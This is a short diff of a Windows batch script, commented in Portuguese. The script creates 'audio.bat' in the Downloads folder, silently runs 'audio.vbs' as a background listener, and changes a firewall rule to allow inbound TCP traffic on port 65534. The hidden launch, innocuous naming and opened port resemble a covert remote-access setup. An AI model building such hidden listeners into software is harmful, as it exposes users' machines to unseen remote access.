@@ -30,8 +30,8 @@ echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
 echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%USERPROFILE%\Downloads\audio.bat"
 echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
-:: Liberar a porta 65534 na saida
-netsh advfirewall firewall add rule name="Abrir Porta Saida 65534" dir=out action=allow protocol=TCP localport=65534
+:: Liberar a porta 65534 na entrada
+netsh advfirewall firewall add rule name="Abrir Porta Entrada 65534" dir=in action=allow protocol=TCP localport=65534
 
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
